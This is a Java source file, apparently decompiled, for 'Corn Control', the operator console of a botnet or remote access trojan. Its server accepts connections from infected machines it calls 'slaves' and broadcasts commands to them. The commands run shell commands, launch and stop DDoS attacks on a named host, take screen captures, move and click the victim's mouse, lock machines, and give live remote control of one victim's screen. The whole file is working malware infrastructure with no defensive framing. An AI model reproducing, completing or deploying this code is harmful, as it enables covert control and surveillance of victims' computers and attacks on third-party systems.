import java.util.ArrayList;
import java.text.DateFormat;
import java.net.SocketException;
import java.util.Date;
import java.util.TimeZone;
import java.text.SimpleDateFormat;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.net.Socket;
import java.net.ServerSocket;
import javax.swing.JButton;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.ListModel;
import java.util.Iterator;
import java.io.IOException;
import javax.swing.Icon;
import javax.swing.JLabel;
import javax.swing.ImageIcon;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JTextField;
import java.awt.Component;
import javax.swing.JScrollPane;
import java.awt.Color;
import java.awt.LayoutManager;
import java.awt.Toolkit;
import javax.swing.JList;
import javax.swing.DefaultListModel;
import javax.swing.JTextArea;
import javax.swing.JFrame;

public class CornController extends JFrame
{
    private JTextArea shell;
    private DefaultListModel<String> onlineList;
    private JList<String> online;
    private SlaveTrader slaveTrader;
    SlaveTrader targets;
    
    public static void main(final String[] args) {
        new CornController();
    }
    
    public void printToShell(final String print) {
        final String prior = this.shell.getText();
        this.shell.setText(String.valueOf(prior) + print + "\n");
    }
    
    public CornController() {
        this.slaveTrader = new SlaveTrader();
        this.targets = new SlaveTrader();
        final int h = Toolkit.getDefaultToolkit().getScreenSize().height;
        final int w = Toolkit.getDefaultToolkit().getScreenSize().width;
        this.setDefaultCloseOperation(3);
        this.setLayout(null);
        this.setAlwaysOnTop(false);
        this.getContentPane().setBackground(Color.blue);
        this.setResizable(false);
        this.setTitle("Corn Control");
        this.setSize(3 * (w / 8), 3 * (h / 4));
        this.setLocation(w / 8, h / 8);
        (this.shell = new JTextArea()).setBackground(Color.cyan);
        this.shell.setEditable(false);
        final JScrollPane scrlShell = new JScrollPane(this.shell);
        scrlShell.setVerticalScrollBarPolicy(22);
        scrlShell.setBounds(w / 85, h / 64, 7 * w / 32, 19 * h / 32);
        this.add(scrlShell);
        final JTextField input = new JTextField();
        input.setBackground(Color.cyan);
        input.setBounds(w / 85, h / 64 + 39 * h / 64, w / 4 - w / 32, h / 20);
        input.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent e) {
                final String command = input.getText();
                input.setText("");
                final String[] components = command.split(" ");
                if (components[0].contentEquals("cmd")) {
                    this.distribute(command);
                    CornController.this.printToShell("running shell command");
                }
                else if (components[0].contentEquals("clickmouse")) {
                    boolean toss = false;
                    for (int i = 1; i < components.length; ++i) {
                        if (components[i].contains("[a-zA-Z]+")) {
                            toss = true;
                        }
                    }
                    if (components.length <= 4 && !toss) {
                        this.distribute(command);
                        CornController.this.printToShell("click registered");
                    }
                    else {
                        CornController.this.printToShell("invalid arguments");
                    }
                }
                else if (components[0].contentEquals("movemouse")) {
                    boolean toss = false;
                    for (int i = 1; i < components.length; ++i) {
                        if (components[i].contains("[a-zA-Z]+")) {
                            toss = true;
                        }
                    }
                    if (components.length == 3 && !toss) {
                        this.distribute(command);
                        CornController.this.printToShell("move registered");
                    }
                    else {
                        CornController.this.printToShell("invalid arguments");
                    }
                }
                else if (components[0].contentEquals("control")) {
                    if (CornController.this.targets.slaves.size() > 1) {
                        CornController.this.printToShell("too many targets");
                    }
                    else {
                        final Slave puppet = CornController.this.targets.slaves.get(0);
                        final Puppeteer puppeteer = new Puppeteer(puppet);
                        final Thread puppetThread = new Thread(puppeteer);
                        puppetThread.start();
                    }
                }
                else if (components[0].contentEquals("stopddos")) {
                    CornController.this.printToShell("stopping ddos");
                    this.distribute("stopddos");
                }
                else if (components[0].contentEquals("ddos")) {
                    if (components.length != 2) {
                        CornController.this.printToShell("invalid arguments");
                    }
                    else {
                        CornController.this.printToShell("performing ddos on " + components[1]);
                        this.distribute("stopddos");
                        this.distribute("ddos " + components[1]);
                    }
                }
                else if (components[0].contentEquals("capture")) {
                    if (CornController.this.targets.slaves.size() > 0) {
                        CornController.this.printToShell("requesting screen captures");
                        this.distribute("capture");
                        final Object[] raw = this.collect();
                        final ImageIcon[] screenCaps = new ImageIcon[CornController.this.targets.slaves.size()];
                        for (int j = 0; j < raw.length; ++j) {
                            screenCaps[j] = (ImageIcon)raw[j];
                        }
                        CornController.this.printToShell("collected screen captures");
                        ImageIcon[] array;
                        for (int length = (array = screenCaps).length, l = 0; l < length; ++l) {
                            final ImageIcon a = array[l];
                            final JFrame dispImg = new JFrame();
                            dispImg.setBounds(0, 0, 800, 500);
                            dispImg.setDefaultCloseOperation(2);
                            final JLabel label = new JLabel();
                            label.setIcon(a);
                            dispImg.add(label);
                            dispImg.setVisible(true);
                        }
                    }
                    else {
                        CornController.this.printToShell("collected screen captures");
                    }
                }
                else if (components[0].contentEquals("lock")) {
                    String send = "";
                    for (int i = 1; i < components.length; ++i) {
                        send = String.valueOf(send) + components[i] + " ";
                    }
                    this.distribute("lockmachine " + send.trim());
                }
                else if (components[0].contentEquals("unlock")) {
                    this.distribute("unlockmachine");
                }
                else if (components[0].contentEquals("select")) {
                    if (components.length >= 2) {
                        if (components[1].contentEquals("all")) {
                            CornController.this.targets.add(CornController.this.slaveTrader);
                            CornController.this.online.addSelectionInterval(0, CornController.this.onlineList.size() - 1);
                        }
                        else {
                            for (int k = 1; k < components.length; ++k) {
                                CornController.this.online.addSelectionInterval(CornController.this.onlineList.indexOf(CornController.this.slaveTrader.get(components[k]).uname), CornController.this.onlineList.indexOf(CornController.this.slaveTrader.get(components[k]).uname));
                            }
                        }
                    }
                    else {
                        CornController.this.printToShell("invalid arguments");
                    }
                }
                else if (components[0].contentEquals("deselect")) {
                    if (components.length >= 2) {
                        if (components[1].contentEquals("all")) {
                            CornController.this.online.clearSelection();
                        }
                        else {
                            for (int k = 1; k < components.length; ++k) {
                                CornController.this.online.removeSelectionInterval(CornController.this.onlineList.indexOf(CornController.this.slaveTrader.get(components[k]).uname), CornController.this.onlineList.indexOf(CornController.this.slaveTrader.get(components[k]).uname));
                            }
                        }
                    }
                    else {
                        CornController.this.printToShell("invalid arguments");
                    }
                }
                else if (components[0].contentEquals("list")) {
                    CornController.this.printToShell(CornController.this.slaveTrader.toString());
                }
                else {
                    CornController.this.printToShell("Invalid Command");
                }
            }
            
            private void distribute(final String command) {
                for (final Slave slv : CornController.this.targets.slaves) {
                    try {
                        slv.oos.writeObject(command);
                        slv.oos.reset();
                        slv.oos.flush();
                    }
                    catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            
            private Object[] collect() {
                final Object[] toReturn = new Object[CornController.this.targets.slaves.size()];
                int i = 0;
                for (final Slave slv : CornController.this.targets.slaves) {
                    try {
                        final Object a = slv.ois.readObject();
                        toReturn[i] = a;
                        ++i;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return toReturn;
            }
        });
        this.add(input);
        this.onlineList = new DefaultListModel<String>();
        (this.online = new JList<String>(this.onlineList)).setBackground(Color.yellow);
        this.online.setBounds(w / 85 + 15 * w / 64, h / 64, 13 * w / 128, 19 * h / 32);
        this.online.setSelectionMode(2);
        this.add(this.online);
        this.online.addListSelectionListener(new ListSelectionListener() {
            @Override
            public void valueChanged(final ListSelectionEvent e) {
                final int start = e.getFirstIndex();
                final int end = e.getLastIndex();
                if (CornController.this.online.isSelectedIndex(start)) {
                    String toShell = "";
                    for (int i = start; i <= end; ++i) {
                        if (CornController.this.slaveTrader.get(CornController.this.onlineList.get(i)) != null && CornController.this.targets.get(CornController.this.onlineList.get(i)) == null) {
                            CornController.this.targets.add(CornController.this.slaveTrader.get(CornController.this.onlineList.get(i)));
                            toShell = String.valueOf(toShell) + CornController.this.onlineList.get(i) + " selected\n";
                        }
                    }
                    if (toShell.length() > 0) {
                        CornController.this.printToShell(toShell.substring(0, toShell.length() - 1));
                    }
                }
                else {
                    String toShell = "";
                    synchronized (CornController.this.targets) {
                        for (int j = start; j <= Math.min(end, CornController.this.targets.slaves.size() - 1); ++j) {
                            if (CornController.this.targets.get(CornController.this.onlineList.get(j)) != null) {
                                CornController.this.targets.remove(CornController.this.targets.get(CornController.this.onlineList.get(j)));
                                toShell = String.valueOf(toShell) + CornController.this.onlineList.get(j) + " deselected\n";
                            }
                        }
                    }
                    // monitorexit(this.this$0.targets)
                    if (toShell.length() > 0) {
                        CornController.this.printToShell(toShell.substring(0, toShell.length() - 1));
                    }
                }
            }
        });
        final JButton selAll = new JButton();
        selAll.setBounds(w / 85 + 15 * w / 64, h / 64 + 39 * h / 64, 13 * w / 128, h / 20);
        selAll.setBackground(Color.orange);
        selAll.setText("Select All");
        selAll.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(final ActionEvent e) {
                if (CornController.this.onlineList.size() > 0) {
                    CornController.this.online.setSelectionInterval(0, CornController.this.onlineList.size() - 1);
                    CornController.this.targets.add(CornController.this.slaveTrader);
                }
                CornController.this.printToShell("Selecting all clients");
            }
        });
        this.add(selAll);
        this.setVisible(true);
        this.up();
    }
    
    public void up() {
        try {
            final ServerSocket CornControl = new ServerSocket(8889);
            while (true) {
                System.out.println("finding client");
                final Socket clientSocket = CornControl.accept();
                System.out.println("client discovered");
                final ClientHandler client = new ClientHandler(clientSocket);
                final Thread handle = new Thread(client);
                handle.start();
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private class Puppeteer extends JFrame implements Runnable
    {
        private Slave puppet;
        private JLabel screen;
        private MouseListener ml;
        
        public Puppeteer(final Slave puppet) {
            this.puppet = puppet;
            final Toolkit tk = Toolkit.getDefaultToolkit();
            this.setBounds(0, 0, (int)tk.getScreenSize().getWidth(), (int)Toolkit.getDefaultToolkit().getScreenSize().getHeight());
            this.setDefaultCloseOperation(1);
            this.setExtendedState(6);
            this.setUndecorated(true);
            this.setAlwaysOnTop(true);
            this.getContentPane().setBackground(Color.green);
            (this.screen = new JLabel()).setBounds(0, 0, (int)tk.getScreenSize().getWidth(), (int)Toolkit.getDefaultToolkit().getScreenSize().getHeight());
            this.screen.setBackground(Color.gray);
            this.add(this.screen);
            this.addMouseListener(this.ml = new MouseListener() {
                @Override
                public void mouseClicked(final MouseEvent e) {
                    try {
                        puppet.oos.writeObject("clickmouse " + Puppeteer.this.getMousePosition().x + " " + Puppeteer.this.getMousePosition().y);
                        puppet.oos.reset();
                        puppet.oos.flush();
                    }
                    catch (IOException e2) {
                        e2.printStackTrace();
                    }
                }
                
                @Override
                public void mousePressed(final MouseEvent e) {
                }
                
                @Override
                public void mouseReleased(final MouseEvent e) {
                }
                
                @Override
                public void mouseEntered(final MouseEvent e) {
                }
                
                @Override
                public void mouseExited(final MouseEvent e) {
                }
            });
            this.setVisible(true);
        }
        
        @Override
        public void run() {
            while (true) {
                System.out.println("hmm");
                synchronized (this.puppet) {
                    ImageIcon raw = null;
                    try {
                        this.puppet.oos.writeObject("capture");
                        this.puppet.oos.reset();
                        this.puppet.oos.flush();
                        raw = (ImageIcon)this.puppet.ois.readObject();
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        this.removeMouseListener(this.ml);
                        // monitorexit(this.puppet)
                        return;
                    }
                    this.screen.setIcon(raw);
                    this.repaint();
                }
                // monitorexit(this.puppet)
                try {
                    Thread.sleep(2000L);
                }
                catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }
    }
    
    public class ClientHandler implements Runnable
    {
        Socket sock;
        
        public ClientHandler(final Socket s) {
            this.sock = s;
        }
        
        @Override
        public void run() {
            System.out.println("handler thread started");
            String user = "";
            ObjectOutputStream oos = null;
            ObjectInputStream ois = null;
            while (true) {
                Label_0102: {
                    try {
                        oos = new ObjectOutputStream(this.sock.getOutputStream());
                        oos.flush();
                        ois = new ObjectInputStream(this.sock.getInputStream());
                        oos.writeObject("ready");
                        oos.reset();
                        oos.flush();
                        user = (String)ois.readObject();
                        break Label_0102;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                    user = String.valueOf(user) + "*";
                }
                if (CornController.this.onlineList.contains(user)) {
                    continue;
                }
                break;
            }
            final DateFormat df = new SimpleDateFormat("dd/MM/yy HH:mm:ss");
            df.setTimeZone(TimeZone.getTimeZone("America/New_York"));
            Date dateobj = new Date();
            CornController.this.printToShell(String.valueOf(user) + " connected at " + df.format(dateobj));
            CornController.this.onlineList.addElement(user);
            final Slave nextSlave = new Slave(this.sock, user.substring(user.indexOf(":") + 1), ois, oos);
            CornController.this.slaveTrader.add(nextSlave);
            try {
                System.out.println("keeping client alive");
                while (true) {
                    try {
                        if (CornController.this.slaveTrader.slaves.size() < 20) {
                            Thread.sleep(1000L);
                        }
                        else {
                            Thread.sleep(10000L);
                        }
                    }
                    catch (InterruptedException e2) {
                        e2.printStackTrace();
                    }
                    try {
                        oos.writeObject("isalive");
                        oos.reset();
                        oos.flush();
                    }
                    catch (SocketException e4) {
                        CornController.this.slaveTrader.remove(nextSlave);
                        dateobj = new Date();
                        CornController.this.printToShell(String.valueOf(nextSlave.uname) + " disconnected at " + df.format(dateobj));
                        synchronized (CornController.this.onlineList) {
                            CornController.this.onlineList.removeElement(nextSlave.uname);
                        }
                        // monitorexit(CornController.access$0(this.this$0))
                    }
                }
            }
            catch (IOException e3) {
                e3.printStackTrace();
            }
        }
    }
    
    private class SlaveTrader
    {
        private ArrayList<Slave> slaves;
        
        public SlaveTrader() {
            this.slaves = new ArrayList<Slave>();
        }
        
        public Slave get(final String uname) {
            if (this.slaves.size() > 0) {
                for (final Slave i : this.slaves) {
                    if (i.uname.contentEquals(uname)) {
                        return i;
                    }
                }
            }
            return null;
        }
        
        public void add(final Slave sl) {
            if (sl == null || this.get(sl.uname) != null) {
                return;
            }
            this.slaves.add(sl);
        }
        
        public boolean remove(final Slave sl) {
            if (sl == null) {
                return false;
            }
            if (this.slaves.size() > 0) {
                for (final Slave s : this.slaves) {
                    if (sl.uname.contentEquals(s.uname)) {
                        this.slaves.remove(s);
                        return true;
                    }
                }
            }
            return false;
        }
        
        public void add(final SlaveTrader trd) {
            if (trd == null) {
                return;
            }
            for (final Slave sl : trd.slaves) {
                if (this.get(sl.uname) == null) {
                    this.slaves.add(sl);
                }
            }
        }
        
        public void remove(final SlaveTrader trd) {
            if (trd == null) {
                return;
            }
            for (final Slave sl : trd.slaves) {
                if (this.get(sl.uname) != null) {
                    this.slaves.remove(sl);
                }
            }
        }
        
        @Override
        public String toString() {
            if (this.slaves.size() == 0) {
                return "[empty]";
            }
            String toReturn = "";
            for (final Slave i : this.slaves) {
                toReturn = String.valueOf(toReturn) + i.uname;
                toReturn = String.valueOf(toReturn) + "\n";
            }
            toReturn = toReturn.substring(0, toReturn.length() - 1);
            return toReturn;
        }
    }
    
    private class Slave
    {
        private Socket s;
        private String uname;
        private ObjectInputStream ois;
        private ObjectOutputStream oos;
        
        public Slave(final Socket socket, final String username, final ObjectInputStream i, final ObjectOutputStream o) {
            this.s = socket;
            this.uname = username;
            this.ois = i;
            this.oos = o;
        }
    }
}
